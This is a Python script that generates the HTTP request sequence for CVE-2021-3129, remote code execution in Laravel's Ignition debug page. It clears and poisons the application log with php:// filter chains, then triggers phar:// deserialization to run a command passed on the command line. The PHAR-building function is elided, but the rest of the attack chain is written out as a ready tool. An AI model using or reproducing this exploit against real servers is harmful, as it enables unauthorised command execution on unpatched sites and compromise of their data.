#!/usr/bin/env python3
"""Emit the full CVE-2021-3129 requests array for a given command."""
import sys, json, base64, urllib.parse

LOG = "/var/www/storage/logs/laravel.log"
CLEAR   = f"php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource={LOG}"
POISON  = (f"php://filter/write=convert.iconv.utf-8.utf-16be"
           f"|convert.quoted-printable-encode"
           f"|convert.iconv.utf-16be.utf-8"
           f"|convert.base64-decode"
           f"/resource={LOG}")
TRIGGER = f"phar://{LOG}/test.txt"

def req(var: str, vf: str) -> dict:
    return {
        "method": "POST",
        "path": "/_ignition/execute-solution",
        "headers": {"Content-Type": "application/json"},
        "body": json.dumps({
            "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
            "parameters": {"variableName": var, "viewFile": vf},
        }),
    }

def build_phar(cmd: str) -> bytes:
    # serialize(PendingBroadcast(Dispatcher("system"), [cmd])) → PHAR
    ...

def main():
    cmd = " ".join(sys.argv[1:]) or "id"
    phar_b64 = base64.b64encode(build_phar(cmd)).decode("ascii")
    out = [req("x", CLEAR)]
    for ch in phar_b64:                     # base64 = printable ASCII, no URL-encode needed
        out.append(req(ch, POISON))
    out.append(req("x", TRIGGER))
    sys.stdout.write(json.dumps(out))       # ← نه print() — بدون \n انتهایی

if __name__ == "__main__":
    main()